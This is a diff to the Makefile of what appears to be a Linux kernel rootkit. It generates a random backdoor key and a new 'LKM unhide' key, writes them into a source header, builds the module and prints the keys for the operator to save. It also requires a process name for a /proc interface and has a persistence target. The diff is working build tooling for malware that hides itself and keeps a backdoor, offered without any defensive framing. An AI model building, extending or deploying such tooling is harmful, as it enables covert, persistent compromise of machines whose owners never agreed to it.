@@ -11,7 +11,8 @@ AS=$(shell which as)
 CTAGS=$(shell which ctags)
 JOURNALCTL := $(shell which journalctl)
 UUIDGEN := $(shell uuidgen)
-BDKEY := $(shell echo "0x$$(od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')")
+BDKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
+UNHIDEKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
 
 # PROCNAME, /proc/<name> interface.
 COMPILER_OPTIONS := -Wall -DPROCNAME='"$(PROCNAME)"' \
@@ -37,10 +38,13 @@ all: persist
 	# TODO: Check if we can generate a random PROCNAME, something like:
 	# PROCNAME ?= $(shell uuidgen | cut -c1-8)
 	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
-	sed -i 's/^#define BDKEY .*/#define BDKEY $(BDKEY)/' src/bdkey.h
+	sed -i 's/^#define BDKEY .*/#define BDKEY $(BDKEY)/' src/auto.h
+	sed -i 's/^#define UNHIDEKEY .*/#define UNHIDEKEY $(UNHIDEKEY)/' src/auto.h
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
-	@echo -n "Backdoor KEY: "
+	@echo -n "Save this Backdoor KEY: "
 	@echo $(BDKEY) | sed 's/^0x//'
+	@echo -n "Save this LKM unhide KEY: "
+	@echo $(UNHIDEKEY) | sed 's/^0x//'
 	@echo PROCNAME=$(PROCNAME)
 
 persist:
